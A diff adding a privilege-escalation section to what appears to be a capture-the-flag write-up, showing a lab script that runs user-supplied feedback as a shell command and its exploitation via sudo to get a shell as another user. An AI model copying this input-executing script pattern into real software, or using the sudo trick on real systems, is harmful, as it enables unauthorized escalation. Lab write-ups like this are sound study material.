@@ -121,5 +121,44 @@ cat user1.txt
 ![Nmap Scan Results](screenshot/firstflag.png)
 
 
+## Phase 5: Privillege Escalation
 
+Horizontal Privilege Escalation (robin → jerry)
+
+1. Check sudo privileges :
+
+```bash
+sudo -l
+```
+Output: User robin can run /home/robin/project/feedback.sh as user jerry without password.
+
+2. Navigate to the project directory and examine the script
+
+```bash
+cd /home/robin/project
+cat feedback.sh
+```
+feedback.sh content :
+
+```bash
+#!/bin/bash
+clear
+echo -e "Script For FeedBack\n"
+read -p "Enter Your Name : " name
+echo ""
+read -p "Enter You FeedBack About This Target Machine : " feedback
+echo ""
+$feedback 2>/dev/null
+echo -e "\nThanks For Your FeedBack...!\n"
+```
+The script executes whatever command is entered as feedback 
+
+3. Execute as jerry :
+   
+```bash
+sudo -u jerry /home/robin/project/feedback.sh
+# Enter Your Name: anything
+# Enter Feedback: /bin/bash
+```
+![Nmap Scan Results](screenshot/firstflag.png)
 
